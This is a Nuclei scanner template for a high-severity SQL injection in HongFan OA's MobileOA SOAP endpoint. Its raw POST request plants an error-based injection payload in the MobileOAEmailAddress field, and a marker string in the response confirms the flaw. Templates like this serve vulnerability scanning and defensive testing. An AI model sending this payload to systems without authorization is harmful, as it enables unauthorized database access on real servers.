nuclei_rules/HongFanOA-MobileOA-sqlInjection.yaml

id: HongFanOA-MobileOA-sqlInjection

info:
  name: HongFanOA-MobileOA-sqlInjection
  author: iSee857
  severity: high
  description: |
    HongFanOA-MobileOA-sqlInjection

http:
  - raw:
      - |
        POST /iOffice/prg/set/wss/MobileOA.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
  
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GeMrNewData xmlns="http://tempuri.org/">
            <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
          </GeMrNewData>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qzbq1qjpbq"

      - type: status
        status:
          - 500